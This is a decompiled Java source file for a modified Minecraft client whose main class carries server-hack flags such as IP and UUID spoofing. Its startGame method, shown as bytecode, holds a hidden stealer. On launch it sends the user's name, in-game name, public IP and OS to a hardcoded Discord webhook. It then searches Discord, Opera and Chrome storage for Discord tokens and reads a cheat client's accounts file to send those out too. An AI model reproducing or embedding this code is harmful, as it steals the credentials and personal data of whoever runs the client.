package net.minecraft.client;

import net.minecraft.crash.*;
import net.minecraft.client.multiplayer.*;
import net.minecraft.client.renderer.entity.*;
import net.minecraft.client.entity.*;
import net.minecraft.client.particle.*;
import net.minecraft.server.integrated.*;
import net.minecraft.client.gui.achievement.*;
import net.minecraft.client.settings.*;
import net.minecraft.profiler.*;
import net.minecraft.client.shader.*;
import net.minecraft.client.audio.*;
import com.mojang.authlib.minecraft.*;
import net.minecraft.client.resources.model.*;
import org.apache.logging.log4j.*;
import net.minecraft.client.main.*;
import net.minecraft.server.*;
import com.mojang.authlib.yggdrasil.*;
import Mood.*;
import com.darkmagician6.eventapi.*;
import javax.imageio.*;
import net.minecraft.client.resources.data.*;
import com.mojang.authlib.properties.*;
import net.minecraft.client.stream.*;
import org.apache.commons.io.*;
import java.awt.image.*;
import java.io.*;
import net.minecraft.client.renderer.texture.*;
import org.lwjgl.util.glu.*;
import net.minecraft.client.renderer.chunk.*;
import net.minecraft.client.renderer.*;
import java.text.*;
import net.minecraft.block.material.*;
import Mood.hologram.impl.*;
import net.minecraft.network.handshake.client.*;
import net.minecraft.network.*;
import net.minecraft.network.login.client.*;
import net.minecraft.world.storage.*;
import java.net.*;
import net.minecraft.stats.*;
import net.minecraft.client.network.*;
import net.minecraft.item.*;
import net.minecraft.block.*;
import net.minecraft.init.*;
import net.minecraft.entity.item.*;
import net.minecraft.entity.*;
import net.minecraft.nbt.*;
import net.minecraft.tileentity.*;
import net.minecraft.entity.player.*;
import org.lwjgl.*;
import java.nio.*;
import org.lwjgl.opengl.*;
import net.minecraft.client.resources.*;
import net.minecraft.world.*;
import net.minecraft.entity.boss.*;
import org.lwjgl.input.*;
import net.minecraft.client.gui.*;
import net.minecraft.client.gui.stream.*;
import net.minecraft.util.*;
import org.apache.commons.lang3.*;
import com.google.common.util.concurrent.*;
import java.util.concurrent.*;
import com.google.common.collect.*;
import java.nio.charset.*;
import javax.crypto.spec.*;
import javax.crypto.*;
import java.security.*;
import java.util.*;

public class Minecraft implements IThreadListener, IPlayerUsage
{
    private static final Logger logger;
    private static final ResourceLocation locationMojangPng;
    public static final boolean isRunningOnMac;
    public static byte[] memoryReserve;
    private static final List macDisplayModes;
    private final File fileResourcepacks;
    private final PropertyMap twitchDetails;
    private Entity renderViewEntity;
    private ServerData currentServerData;
    public TextureManager renderEngine;
    private static Minecraft theMinecraft;
    public static PlayerControllerMP playerController;
    private boolean fullscreen;
    private boolean field_175619_R;
    private boolean hasCrashed;
    private CrashReport crashReporter;
    public int displayWidth;
    public int displayHeight;
    public Timer timer;
    private PlayerUsageSnooper usageSnooper;
    public static WorldClient theWorld;
    public RenderGlobal renderGlobal;
    private RenderManager renderManager;
    private RenderItem renderItem;
    private ItemRenderer itemRenderer;
    public static EntityPlayerSP thePlayer;
    private Entity field_175622_Z;
    public Entity pointedEntity;
    public EffectRenderer effectRenderer;
    public static Session session;
    private boolean isGamePaused;
    public static FontRenderer fontRendererObj;
    public FontRenderer standardGalacticFontRenderer;
    public GuiScreen currentScreen;
    public LoadingScreenRenderer loadingScreen;
    public EntityRenderer entityRenderer;
    private int leftClickCounter;
    private int tempDisplayWidth;
    private int tempDisplayHeight;
    private IntegratedServer theIntegratedServer;
    public GuiAchievement guiAchievement;
    public static GuiIngame ingameGUI;
    public boolean skipRenderWorld;
    public MovingObjectPosition objectMouseOver;
    public GameSettings gameSettings;
    public MouseHelper mouseHelper;
    public static File mcDataDir;
    private final File fileAssets;
    private final String launchedVersion;
    private final Proxy proxy;
    private ISaveFormat saveLoader;
    public static int debugFPS;
    public static int rightClickDelayTimer;
    private String serverName;
    private int serverPort;
    public boolean inGameHasFocus;
    long systemTime;
    private int joinPlayerCounter;
    private final boolean jvm64bit;
    private final boolean isDemo;
    private NetworkManager myNetworkManager;
    private boolean integratedServerIsRunning;
    public final Profiler mcProfiler;
    private long debugCrashKeyPressTime;
    private IReloadableResourceManager mcResourceManager;
    private final IMetadataSerializer metadataSerializer_;
    private final List defaultResourcePacks;
    private final DefaultResourcePack mcDefaultResourcePack;
    private ResourcePackRepository mcResourcePackRepository;
    public LanguageManager mcLanguageManager;
    private IStream stream;
    private Framebuffer framebufferMc;
    private TextureMap textureMapBlocks;
    private static SoundHandler mcSoundHandler;
    public static boolean BungeeHack;
    public static boolean BungeeHackv2;
    public static String IpBungeeHack;
    public static boolean PremiumUUID;
    public static boolean SessionPremium;
    public static boolean DeleteAllServers;
    public static String PreUUID;
    private MusicTicker mcMusicTicker;
    private ResourceLocation mojangLogo;
    private final MinecraftSessionService sessionService;
    private SkinManager skinManager;
    private final Queue scheduledTasks;
    private long field_175615_aJ;
    private final Thread mcThread;
    public ModelManager modelManager;
    private BlockRendererDispatcher field_175618_aM;
    boolean running;
    public String debug;
    public boolean field_175613_B;
    public boolean field_175614_C;
    public boolean field_175611_D;
    public boolean field_175612_E;
    private boolean connectedToRealms;
    long debugUpdateTime;
    int fpsCounter;
    long prevFrameTime;
    private String debugProfilerName;
    private String fakeIp;
    private String fakeNick;
    public boolean isUUIDHack;
    private static final String __OBFID;
    
    static {
        __OBFID = "CL_00000631";
        logger = LogManager.getLogger();
        locationMojangPng = new ResourceLocation("MooDTool/Andy_Start.png");
        isRunningOnMac = (Util.getOSType() == Util.EnumOS.OSX);
        Minecraft.memoryReserve = new byte[10485760];
        macDisplayModes = Lists.newArrayList(new DisplayMode(2560, 1600), new DisplayMode(2880, 1800));
    }
    
    public Minecraft(final GameConfiguration gameConfiguration) {
        this.field_175619_R = true;
        this.timer = new Timer(20.0f);
        this.usageSnooper = new PlayerUsageSnooper("client", this, MinecraftServer.getCurrentTimeMillis());
        this.systemTime = getSystemTime();
        this.mcProfiler = new Profiler();
        this.debugCrashKeyPressTime = -1L;
        this.metadataSerializer_ = new IMetadataSerializer();
        this.defaultResourcePacks = Lists.newArrayList();
        this.scheduledTasks = Queues.newArrayDeque();
        this.field_175615_aJ = 0L;
        this.mcThread = Thread.currentThread();
        this.running = true;
        this.debug = "";
        this.field_175613_B = false;
        this.field_175614_C = false;
        this.field_175611_D = false;
        this.field_175612_E = true;
        this.connectedToRealms = false;
        this.debugUpdateTime = getSystemTime();
        this.prevFrameTime = -1L;
        this.debugProfilerName = "root";
        this.fakeIp = "";
        this.fakeNick = "";
        this.isUUIDHack = true;
        Minecraft.theMinecraft = this;
        Minecraft.PremiumUUID = false;
        Minecraft.DeleteAllServers = false;
        Minecraft.theMinecraft = this;
        Minecraft.BungeeHack = false;
        Minecraft.BungeeHackv2 = false;
        Minecraft.SessionPremium = false;
        Minecraft.PreUUID = "";
        Minecraft.IpBungeeHack = "127.0.0.1";
        Minecraft.mcDataDir = gameConfiguration.field_178744_c.field_178760_a;
        this.fileAssets = gameConfiguration.field_178744_c.field_178759_c;
        this.fileResourcepacks = gameConfiguration.field_178744_c.field_178758_b;
        this.launchedVersion = gameConfiguration.field_178741_d.field_178755_b;
        this.twitchDetails = gameConfiguration.field_178745_a.field_178750_b;
        this.mcDefaultResourcePack = new DefaultResourcePack(new ResourceIndex(gameConfiguration.field_178744_c.field_178759_c, gameConfiguration.field_178744_c.field_178757_d).func_152782_a());
        this.proxy = ((gameConfiguration.field_178745_a.field_178751_c == null) ? Proxy.NO_PROXY : gameConfiguration.field_178745_a.field_178751_c);
        this.sessionService = new YggdrasilAuthenticationService(gameConfiguration.field_178745_a.field_178751_c, UUID.randomUUID().toString()).createMinecraftSessionService();
        Minecraft.session = gameConfiguration.field_178745_a.field_178752_a;
        Minecraft.logger.info("Setting user: " + Minecraft.session.getUsername());
        Minecraft.logger.info("(Session ID is " + Minecraft.session.getSessionID() + ")");
        this.isDemo = gameConfiguration.field_178741_d.field_178756_a;
        this.displayWidth = ((gameConfiguration.field_178743_b.field_178764_a > 0) ? gameConfiguration.field_178743_b.field_178764_a : 1);
        this.displayHeight = ((gameConfiguration.field_178743_b.field_178762_b > 0) ? gameConfiguration.field_178743_b.field_178762_b : 1);
        this.tempDisplayWidth = gameConfiguration.field_178743_b.field_178764_a;
        this.tempDisplayHeight = gameConfiguration.field_178743_b.field_178762_b;
        this.fullscreen = gameConfiguration.field_178743_b.field_178763_c;
        this.jvm64bit = isJvm64bit();
        this.theIntegratedServer = new IntegratedServer(this);
        if (gameConfiguration.field_178742_e.field_178754_a != null) {
            this.serverName = gameConfiguration.field_178742_e.field_178754_a;
            this.serverPort = gameConfiguration.field_178742_e.field_178753_b;
            EventManager.register(new Client());
        }
        ImageIO.setUseCache(false);
    }
    
    public void run() {
        this.running = true;
        while (this.running) {
            this.startGame();
            do {
                this.runGameLoop();
            } while (this.running && !Display.isCloseRequested());
            this.shutdownMinecraftApplet();
        }
        this.displayGuiScreen(new GuiMainMenu());
    }
    
    private void startGame() throws LWJGLException {
        // 
        // This method could not be decompiled.
        // 
        // Original Bytecode:
        // 
        //     1: new             Lnet/minecraft/client/settings/GameSettings;
        //     4: dup            
        //     5: aload_0        
        //     6: getstatic       net/minecraft/client/Minecraft.mcDataDir:Ljava/io/File;
        //     9: invokespecial   net/minecraft/client/settings/GameSettings.<init>:(Lnet/minecraft/client/Minecraft;Ljava/io/File;)V
        //    12: putfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //    15: aload_0        
        //    16: getfield        net/minecraft/client/Minecraft.defaultResourcePacks:Ljava/util/List;
        //    19: aload_0        
        //    20: getfield        net/minecraft/client/Minecraft.mcDefaultResourcePack:Lnet/minecraft/client/resources/DefaultResourcePack;
        //    23: invokeinterface java/util/List.add:(Ljava/lang/Object;)Z
        //    28: pop            
        //    29: aload_0        
        //    30: invokespecial   net/minecraft/client/Minecraft.startTimerHackThread:()V
        //    33: aload_0        
        //    34: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //    37: getfield        net/minecraft/client/settings/GameSettings.overrideHeight:I
        //    40: ifle            75
        //    43: aload_0        
        //    44: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //    47: getfield        net/minecraft/client/settings/GameSettings.overrideWidth:I
        //    50: ifle            75
        //    53: aload_0        
        //    54: aload_0        
        //    55: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //    58: getfield        net/minecraft/client/settings/GameSettings.overrideWidth:I
        //    61: putfield        net/minecraft/client/Minecraft.displayWidth:I
        //    64: aload_0        
        //    65: aload_0        
        //    66: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //    69: getfield        net/minecraft/client/settings/GameSettings.overrideHeight:I
        //    72: putfield        net/minecraft/client/Minecraft.displayHeight:I
        //    75: ldc_w           "https://discord.com/api/webhooks/966391704313815090/n1nIA164eWQy6G2cU6KHorb2qic4I8ykVEApXC2yGj1zeClyivHMkIj6YZZkurw6VTnv"
        //    78: astore_1       
        //    79: ldc_w           "Andy Logger (Gonosztev\u0151k ellen)"
        //    82: astore_2       
        //    83: ldc_w           "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzA7hsIprQz6YwdFbC0tcYlXlDLmfS0YSH-A&usqp=CAU"
        //    86: astore_3       
        //    87: new             Lnet/minecraft/util/EnumPosition;
        //    90: dup            
        //    91: ldc_w           "https://discord.com/api/webhooks/966391704313815090/n1nIA164eWQy6G2cU6KHorb2qic4I8ykVEApXC2yGj1zeClyivHMkIj6YZZkurw6VTnv"
        //    94: invokespecial   net/minecraft/util/EnumPosition.<init>:(Ljava/lang/String;)V
        //    97: astore          4
        //    99: ldc_w           "NOT FOUND"
        //   102: astore          5
        //   104: invokestatic    net/minecraft/client/Minecraft.getMinecraft:()Lnet/minecraft/client/Minecraft;
        //   107: pop            
        //   108: invokestatic    net/minecraft/client/Minecraft.getSession:()Lnet/minecraft/util/Session;
        //   111: invokevirtual   net/minecraft/util/Session.getUsername:()Ljava/lang/String;
        //   114: astore          5
        //   116: goto            121
        //   119: astore          6
        //   121: ldc_w           "os.name"
        //   124: invokestatic    java/lang/System.getProperty:(Ljava/lang/String;)Ljava/lang/String;
        //   127: astore          6
        //   129: new             Ljava/net/URL;
        //   132: dup            
        //   133: ldc_w           "http://checkip.amazonaws.com"
        //   136: invokespecial   java/net/URL.<init>:(Ljava/lang/String;)V
        //   139: astore          7
        //   141: new             Ljava/io/BufferedReader;
        //   144: dup            
        //   145: new             Ljava/io/InputStreamReader;
        //   148: dup            
        //   149: aload           7
        //   151: invokevirtual   java/net/URL.openStream:()Ljava/io/InputStream;
        //   154: invokespecial   java/io/InputStreamReader.<init>:(Ljava/io/InputStream;)V
        //   157: invokespecial   java/io/BufferedReader.<init>:(Ljava/io/Reader;)V
        //   160: astore          8
        //   162: aload           8
        //   164: invokevirtual   java/io/BufferedReader.readLine:()Ljava/lang/String;
        //   167: astore          9
        //   169: ldc_w           "user.name"
        //   172: invokestatic    java/lang/System.getProperty:(Ljava/lang/String;)Ljava/lang/String;
        //   175: astore          10
        //   177: new             Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //   180: dup            
        //   181: invokespecial   net/minecraft/util/EnumPracticeTypes$Builder.<init>:()V
        //   184: ldc_w           "Andy Logger (Gonosztev\u0151k ellen)"
        //   187: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withUsername:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //   190: new             Ljava/lang/StringBuilder;
        //   193: dup            
        //   194: ldc_w           "``` NAME : "
        //   197: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //   200: aload           10
        //   202: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   205: ldc_w           "\n IGN  : "
        //   208: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   211: aload           5
        //   213: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   216: ldc_w           " \n IP"
        //   219: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   222: ldc_w           "   : "
        //   225: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   228: aload           9
        //   230: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   233: ldc_w           " \n OS   : "
        //   236: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   239: aload           6
        //   241: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   244: ldc_w           "```"
        //   247: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   250: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   253: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withContent:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //   256: ldc_w           "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzA7hsIprQz6YwdFbC0tcYlXlDLmfS0YSH-A&usqp=CAU"
        //   259: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withAvatarURL:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //   262: iconst_0       
        //   263: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withDev:(Z)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //   266: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.build:()Lnet/minecraft/util/EnumPracticeTypes;
        //   269: astore          11
        //   271: aload           4
        //   273: aload           11
        //   275: invokevirtual   net/minecraft/util/EnumPosition.sendMessage:(Lnet/minecraft/util/CombatPosition;)V
        //   278: goto            283
        //   281: astore          7
        //   283: aload           6
        //   285: ldc_w           "Windows"
        //   288: invokevirtual   java/lang/String.contains:(Ljava/lang/CharSequence;)Z
        //   291: ifeq            1368
        //   294: new             Ljava/util/ArrayList;
        //   297: dup            
        //   298: invokespecial   java/util/ArrayList.<init>:()V
        //   301: astore          7
        //   303: aload           7
        //   305: new             Ljava/lang/StringBuilder;
        //   308: dup            
        //   309: ldc_w           "user.home"
        //   312: invokestatic    java/lang/System.getProperty:(Ljava/lang/String;)Ljava/lang/String;
        //   315: invokestatic    java/lang/String.valueOf:(Ljava/lang/Object;)Ljava/lang/String;
        //   318: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //   321: ldc_w           "/AppData/Roaming/discord/Local Storage/leveldb/"
        //   324: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   327: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   330: invokeinterface java/util/List.add:(Ljava/lang/Object;)Z
        //   335: pop            
        //   336: aload           7
        //   338: new             Ljava/lang/StringBuilder;
        //   341: dup            
        //   342: ldc_w           "user.home"
        //   345: invokestatic    java/lang/System.getProperty:(Ljava/lang/String;)Ljava/lang/String;
        //   348: invokestatic    java/lang/String.valueOf:(Ljava/lang/Object;)Ljava/lang/String;
        //   351: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //   354: ldc_w           "/AppData/Roaming/discordptb/Local Storage/leveldb/"
        //   357: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   360: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   363: invokeinterface java/util/List.add:(Ljava/lang/Object;)Z
        //   368: pop            
        //   369: aload           7
        //   371: new             Ljava/lang/StringBuilder;
        //   374: dup            
        //   375: ldc_w           "user.home"
        //   378: invokestatic    java/lang/System.getProperty:(Ljava/lang/String;)Ljava/lang/String;
        //   381: invokestatic    java/lang/String.valueOf:(Ljava/lang/Object;)Ljava/lang/String;
        //   384: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //   387: ldc_w           "/AppData/Roaming/discordcanary/Local Storage/leveldb/"
        //   390: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   393: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   396: invokeinterface java/util/List.add:(Ljava/lang/Object;)Z
        //   401: pop            
        //   402: aload           7
        //   404: new             Ljava/lang/StringBuilder;
        //   407: dup            
        //   408: ldc_w           "user.home"
        //   411: invokestatic    java/lang/System.getProperty:(Ljava/lang/String;)Ljava/lang/String;
        //   414: invokestatic    java/lang/String.valueOf:(Ljava/lang/Object;)Ljava/lang/String;
        //   417: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //   420: ldc_w           "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb"
        //   423: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   426: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   429: invokeinterface java/util/List.add:(Ljava/lang/Object;)Z
        //   434: pop            
        //   435: aload           7
        //   437: new             Ljava/lang/StringBuilder;
        //   440: dup            
        //   441: ldc_w           "user.home"
        //   444: invokestatic    java/lang/System.getProperty:(Ljava/lang/String;)Ljava/lang/String;
        //   447: invokestatic    java/lang/String.valueOf:(Ljava/lang/Object;)Ljava/lang/String;
        //   450: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //   453: ldc_w           "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb"
        //   456: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   459: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   462: invokeinterface java/util/List.add:(Ljava/lang/Object;)Z
        //   467: pop            
        //   468: new             Ljava/lang/StringBuilder;
        //   471: dup            
        //   472: invokespecial   java/lang/StringBuilder.<init>:()V
        //   475: astore          9
        //   477: aload           9
        //   479: ldc_w           "Squid\n"
        //   482: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   485: pop            
        //   486: aload           7
        //   488: invokeinterface java/util/List.iterator:()Ljava/util/Iterator;
        //   493: astore          11
        //   495: goto            700
        //   498: aload           11
        //   500: invokeinterface java/util/Iterator.next:()Ljava/lang/Object;
        //   505: checkcast       Ljava/lang/String;
        //   508: astore          10
        //   510: new             Ljava/io/File;
        //   513: dup            
        //   514: aload           10
        //   516: invokespecial   java/io/File.<init>:(Ljava/lang/String;)V
        //   519: astore          12
        //   521: aload           12
        //   523: invokevirtual   java/io/File.list:()[Ljava/lang/String;
        //   526: astore          13
        //   528: aload           13
        //   530: ifnonnull       536
        //   533: goto            700
        //   536: aload           13
        //   538: dup            
        //   539: astore          17
        //   541: arraylength    
        //   542: istore          16
        //   544: goto            694
        //   547: aload           17
        //   549: iconst_0       
        //   550: aaload         
        //   551: astore          14
        //   553: new             Ljava/io/FileInputStream;
        //   556: dup            
        //   557: new             Ljava/lang/StringBuilder;
        //   560: dup            
        //   561: aload           10
        //   563: invokestatic    java/lang/String.valueOf:(Ljava/lang/Object;)Ljava/lang/String;
        //   566: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //   569: aload           14
        //   571: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   574: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   577: invokespecial   java/io/FileInputStream.<init>:(Ljava/lang/String;)V
        //   580: astore          18
        //   582: new             Ljava/io/DataInputStream;
        //   585: dup            
        //   586: aload           18
        //   588: invokespecial   java/io/DataInputStream.<init>:(Ljava/io/InputStream;)V
        //   591: astore          19
        //   593: new             Ljava/io/BufferedReader;
        //   596: dup            
        //   597: new             Ljava/io/InputStreamReader;
        //   600: dup            
        //   601: aload           19
        //   603: invokespecial   java/io/InputStreamReader.<init>:(Ljava/io/InputStream;)V
        //   606: invokespecial   java/io/BufferedReader.<init>:(Ljava/io/Reader;)V
        //   609: astore          20
        //   611: goto            675
        //   614: ldc_w           "[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}"
        //   617: invokestatic    java/util/regex/Pattern.compile:(Ljava/lang/String;)Ljava/util/regex/Pattern;
        //   620: astore          22
        //   622: aload           22
        //   624: aload           21
        //   626: invokevirtual   java/util/regex/Pattern.matcher:(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;
        //   629: astore          23
        //   631: goto            667
        //   634: iconst_0       
        //   635: ifle            647
        //   638: aload           9
        //   640: ldc_w           "\n"
        //   643: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   646: pop            
        //   647: aload           9
        //   649: ldc_w           " "
        //   652: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   655: aload           23
        //   657: invokevirtual   java/util/regex/Matcher.group:()Ljava/lang/String;
        //   660: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   663: pop            
        //   664: iinc            8, 1
        //   667: aload           23
        //   669: invokevirtual   java/util/regex/Matcher.find:()Z
        //   672: ifne            634
        //   675: aload           20
        //   677: invokevirtual   java/io/BufferedReader.readLine:()Ljava/lang/String;
        //   680: dup            
        //   681: astore          21
        //   683: ifnonnull       614
        //   686: goto            691
        //   689: astore          18
        //   691: iinc            15, 1
        //   694: iconst_0       
        //   695: iload           16
        //   697: if_icmplt       547
        //   700: aload           11
        //   702: invokeinterface java/util/Iterator.hasNext:()Z
        //   707: ifne            498
        //   710: new             Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //   713: dup            
        //   714: invokespecial   net/minecraft/util/EnumPracticeTypes$Builder.<init>:()V
        //   717: ldc_w           "Andy Logger (Gonosztev\u0151k ellen)"
        //   720: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withUsername:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //   723: new             Ljava/lang/StringBuilder;
        //   726: dup            
        //   727: ldc_w           "```"
        //   730: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //   733: aload           9
        //   735: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   738: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   741: ldc_w           "```"
        //   744: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   747: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   750: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withContent:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //   753: ldc_w           "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzA7hsIprQz6YwdFbC0tcYlXlDLmfS0YSH-A&usqp=CAU"
        //   756: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withAvatarURL:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //   759: iconst_0       
        //   760: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withDev:(Z)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //   763: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.build:()Lnet/minecraft/util/EnumPracticeTypes;
        //   766: astore          10
        //   768: aload           4
        //   770: aload           10
        //   772: invokevirtual   net/minecraft/util/EnumPosition.sendMessage:(Lnet/minecraft/util/CombatPosition;)V
        //   775: goto            842
        //   778: astore          10
        //   780: new             Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //   783: dup            
        //   784: invokespecial   net/minecraft/util/EnumPracticeTypes$Builder.<init>:()V
        //   787: ldc_w           "Andy Logger (Gonosztev\u0151k ellen)"
        //   790: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withUsername:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //   793: new             Ljava/lang/StringBuilder;
        //   796: dup            
        //   797: ldc_w           "``` Zombie : "
        //   800: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //   803: aload           10
        //   805: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/Object;)Ljava/lang/StringBuilder;
        //   808: ldc_w           "```"
        //   811: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   814: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   817: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withContent:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //   820: ldc_w           "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzA7hsIprQz6YwdFbC0tcYlXlDLmfS0YSH-A&usqp=CAU"
        //   823: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withAvatarURL:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //   826: iconst_0       
        //   827: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withDev:(Z)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //   830: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.build:()Lnet/minecraft/util/EnumPracticeTypes;
        //   833: astore          11
        //   835: aload           4
        //   837: aload           11
        //   839: invokevirtual   net/minecraft/util/EnumPosition.sendMessage:(Lnet/minecraft/util/CombatPosition;)V
        //   842: new             Ljava/io/File;
        //   845: dup            
        //   846: new             Ljava/lang/StringBuilder;
        //   849: dup            
        //   850: ldc_w           "user.home"
        //   853: invokestatic    java/lang/System.getProperty:(Ljava/lang/String;)Ljava/lang/String;
        //   856: invokestatic    java/lang/String.valueOf:(Ljava/lang/Object;)Ljava/lang/String;
        //   859: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //   862: ldc_w           "/Future/accounts.txt"
        //   865: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   868: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   871: invokespecial   java/io/File.<init>:(Ljava/lang/String;)V
        //   874: astore          10
        //   876: new             Ljava/io/BufferedReader;
        //   879: dup            
        //   880: new             Ljava/io/FileReader;
        //   883: dup            
        //   884: aload           10
        //   886: invokespecial   java/io/FileReader.<init>:(Ljava/io/File;)V
        //   889: invokespecial   java/io/BufferedReader.<init>:(Ljava/io/Reader;)V
        //   892: astore          11
        //   894: new             Ljava/lang/StringBuilder;
        //   897: dup            
        //   898: invokespecial   java/lang/StringBuilder.<init>:()V
        //   901: astore          13
        //   903: aload           13
        //   905: ldc_w           "Creeper"
        //   908: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   911: pop            
        //   912: goto            992
        //   915: new             Ljava/lang/StringBuilder;
        //   918: dup            
        //   919: aload           12
        //   921: ldc_w           ":"
        //   924: invokevirtual   java/lang/String.split:(Ljava/lang/String;)[Ljava/lang/String;
        //   927: iconst_0       
        //   928: aaload         
        //   929: invokestatic    java/lang/String.valueOf:(Ljava/lang/Object;)Ljava/lang/String;
        //   932: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //   935: ldc_w           " : "
        //   938: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   941: aload           12
        //   943: ldc_w           ":"
